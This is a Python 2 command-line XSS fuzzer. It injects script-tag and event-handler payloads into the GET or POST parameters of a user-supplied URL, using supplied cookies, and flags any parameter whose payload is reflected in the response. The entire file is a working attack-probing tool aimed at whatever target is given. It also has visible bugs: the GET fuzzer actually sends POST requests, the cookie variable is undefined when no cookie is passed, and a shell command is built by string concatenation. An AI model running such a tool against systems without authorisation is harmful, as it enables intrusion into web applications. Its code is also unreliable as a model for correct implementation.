import requests
from optparse import OptionParser
import tempfile
import os

class XssFuzzer:

	payloads = [
	"<script>alert(1)</script>",
	"\"><script>alert(1)</script>",
	"\" onerror=\"alert(1)\""
	]

	def __init__(self, verbose=False):
		self.verbosity = verbose

	def getPayloads(self):
		return self.payloads

	def checkResult(self, body, payload):
		'''
		Easy assumption, if the payload is rendered in the HTML body
		then the parameter is vulnerable to XSS.
		Not always true btw.
		'''
		if payload in body:
			return True
		else:
			return False

	def makeGoodPostRequest(self,url,data,cookie):
		'''
		Make a post request with good data (no xss payloads)
		This because it is helpful to view diffs with the malformed request
		'''
		r = requests.post(url,data=data, cookies=cookie)
		self.good_req = tempfile.NamedTemporaryFile()
		self.good_req.write(r.text)

	def makeGoodGetRequest(self, url, params, cookie):
		'''
		Same.
		'''
		r = requests.get(url, params=params, cookies=cookie)
		self.good_req = tempfile.NamedTemporaryFile()
		self.good_req.write(r.text)

	def fuzzGet(self, url, params, cookie):
		'''
		Fuzz get parameters with self.payloads
		'''
		for key in params.keys():
			fuzz_dict = {}
			fuzz_dict = params.copy()
			for payload in self.payloads:
				fuzz_dict[key] = payload
				r = requests.post(url, params=fuzz_dict, cookies=cookie)
				
				if self.verbosity:
					self.gitDiff(r.text)
				
				if self.checkResult(r.text, payload):
					print "[!] Found payload: "+ payload + " in body for param: " + key


	def gitDiff(self, text):
		'''
		You need git to be installed in your machine.
		Helps spotting the differences between good and bad requests
		'''
		f = tempfile.NamedTemporaryFile()
		f.write(text)
		os.system("git diff --unified=0 " +self.good_req.name + " " + f.name)
		f.close()

	def fuzzPost(self, url, data, cookie):
		for key in data.keys():
			fuzz_dict = {}
			fuzz_dict = data.copy()
			for payload in self.payloads:
				fuzz_dict[key] = payload
				r = requests.post(url, data=fuzz_dict, cookies=cookie)
				
				if self.verbosity:
					self.gitDiff(r.text)
				
				if self.checkResult(r.text, payload):
					print "[!] Found payload: "+ payload + " in body for param: " + key

def main():
	parser = OptionParser(usage="usage: %prog [options] filename",
						  version="%prog 1.0")
	parser.add_option("-u", "--url",
					  action="store",
					  dest="url",
					  default=None,
					  help="Specify the target URL")
	parser.add_option("-d", "--data",
					  action="store", 
					  dest="data",
					  default=None,
					  help="The POST data to fuzz",)
	parser.add_option("-c", "--cookie",
					  action="store",
					  dest="cookie",
					  default=None,
					  help="The cookie to send",)
	parser.add_option("-v", "--verbose",
					  action="store_true", 
					  dest="verbose",
					  default=False,
					  help="Use git diff to spot injections",)
	(options, args) = parser.parse_args()

	if options.url:
		xss = XssFuzzer(verbose=options.verbose)
		
		if options.data:
			data = {}

			def splitPost(p):
				d = p.split("=")
				data[d[0]] = d[1]

			post = (options.data).split("&")
			[splitPost(p) for p in post]

		if options.cookie:
			cookie = {}
			def splitCookie(p):
				d = p.split("=")
				cookie[d[0]] = d[1]

			cookies = (options.cookie).split("; ")
			[splitCookie(c) for c in cookies]
		
		if options.data:
			xss.makeGoodPostRequest(options.url, data, cookie)
			xss.fuzzPost(options.url, data, cookie)
		else:
			params = {}
			def splitGet(p):
				d = p.split("=")
				params[d[0]] = d[1]

			get = ((options.url).split("?")[1]).split("&")
			[splitGet(p) for p in get]
			xss.makeGoodGetRequest(options.url, params, cookie)
			xss.fuzzGet(options.url, params, cookie) 
				
	else:
		print "[-] At least we need a URL"

if __name__ == '__main__':
	main()